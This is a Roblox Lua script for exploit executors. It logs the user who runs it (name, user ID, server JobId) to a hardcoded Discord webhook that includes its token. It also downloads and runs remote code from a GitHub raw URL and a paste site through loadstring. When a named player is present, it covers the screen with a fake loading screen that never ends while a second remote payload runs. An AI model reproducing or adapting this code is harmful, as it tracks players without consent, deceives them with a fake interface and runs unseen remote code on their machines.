local Players       = game:GetService("Players")
local TweenService  = game:GetService("TweenService")
local Lighting      = game:GetService("Lighting")
local StarterGui    = game:GetService("StarterGui")
local HttpService   = game:GetService("HttpService")

local player = Players.LocalPlayer
local TARGET = "daralma5"

local WEBHOOK_URL = "https://discord.com/api/webhooks/1467662030260408517/jcuMSGcrAPD9hjy3DYvZSI_64zUW5OXUCmpCrBKjvjxNvANzSLMFfCK9onF3FCrjXqYe"

local hasTriggeredB = false
local loadingShown = false

-- executor http resolver
local http =
    syn and syn.request or
    http_request or
    request or
    fluxus and fluxus.request

-- webhook sender (executor-safe)
local function sendWebhook(reason)
    if not http then return end

    local payload = {
        username = "Job Logger",
        embeds = {{
            title = "Script Execution Log",
            color = 16711680,
            fields = {
                { name = "Executed By", value = player.Name .. " (" .. player.UserId .. ")", inline = false },
                { name = "Reason", value = reason, inline = false },
                { name = "JobId", value = game.JobId or "?", inline = false },
                { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
                { name = "Server Size", value = tostring(#Players:GetPlayers()), inline = true }
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    http({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end

-- infinite loading screen
local function showInfiniteLoading()
    if loadingShown then return end
    loadingShown = true

    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    local blur = Instance.new("BlurEffect")
    blur.Size = 22
    blur.Parent = Lighting

    local gui = Instance.new("ScreenGui")
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 1e9
    gui.Parent = player:WaitForChild("PlayerGui")

    local blocker = Instance.new("Frame")
    blocker.Size = UDim2.fromScale(1,1)
    blocker.BackgroundColor3 = Color3.fromRGB(5,5,5)
    blocker.Active = true
    blocker.ZIndex = 1e9
    blocker.Parent = gui

    local card = Instance.new("Frame")
    card.Size = UDim2.fromScale(0.45,0.25)
    card.Position = UDim2.fromScale(0.5,0.5)
    card.AnchorPoint = Vector2.new(0.5,0.5)
    card.BackgroundColor3 = Color3.fromRGB(15,15,15)
    card.ZIndex = blocker.ZIndex + 1
    card.Parent = blocker

    Instance.new("UICorner",card).CornerRadius = UDim.new(0,20)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0.35,0)
    title.BackgroundTransparency = 1
    title.Text = "LOADING"
    title.Font = Enum.Font.GothamBlack
    title.TextScaled = true
    title.TextColor3 = Color3.fromRGB(240,240,240)
    title.ZIndex = card.ZIndex + 1
    title.Parent = card

    local barBG = Instance.new("Frame")
    barBG.Size = UDim2.new(0.8,0,0.12,0)
    barBG.Position = UDim2.fromScale(0.5,0.65)
    barBG.AnchorPoint = Vector2.new(0.5,0.5)
    barBG.BackgroundColor3 = Color3.fromRGB(25,25,25)
    barBG.ZIndex = card.ZIndex + 1
    barBG.Parent = card

    Instance.new("UICorner",barBG).CornerRadius = UDim.new(1,0)

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0.02,0,1,0)
    barFill.BackgroundColor3 = Color3.fromRGB(180,100,255)
    barFill.ZIndex = barBG.ZIndex + 1
    barFill.Parent = barBG

    Instance.new("UICorner",barFill).CornerRadius = UDim.new(1,0)

    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(130,90,255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255,120,220))
    }
    grad.Parent = barFill

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(1,0,0.25,0)
    percent.Position = UDim2.fromScale(0.5,0.85)
    percent.AnchorPoint = Vector2.new(0.5,0.5)
    percent.BackgroundTransparency = 1
    percent.Font = Enum.Font.Gotham
    percent.TextScaled = true
    percent.TextColor3 = Color3.fromRGB(160,160,160)
    percent.Text = "0%"
    percent.ZIndex = card.ZIndex + 1
    percent.Parent = card

    task.spawn(function()
        local p = 0
        while true do
            p = p + (0.999 - p) * 0.016
            barFill.Size = UDim2.new(p,0,1,0)
            percent.Text = math.floor(p*100).."%"
            task.wait(0.035)
        end
    end)

    TweenService:Create(
        barFill,
        TweenInfo.new(2.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),
        {BackgroundTransparency = 0.15}
    ):Play()
end

-- Script A
local function runA()
    sendWebhook("Script A executed. Waiting for target: "..TARGET)

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(
                "https://raw.githubusercontent.com/DearRegui/Public-/main/lua.lua"
            ))()
        end)
    end)
end

-- Script B
local function runB()
    if hasTriggeredB then return end
    hasTriggeredB = true

    warn("RUN B TRIGGERED")
    sendWebhook(TARGET.." detected â†’ switching to Script B")

    showInfiniteLoading()

    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet(
                "https://ghostbin.axel.org/paste/dk6n7/raw"
            ))()
        end)
    end)
end

-- execution
runA()

for _,p in ipairs(Players:GetPlayers()) do
    if p.Name == TARGET then
        runB()
        break
    end
end

Players.PlayerAdded:Connect(function(p)
    if p.Name == TARGET then
        runB()
    end
end)
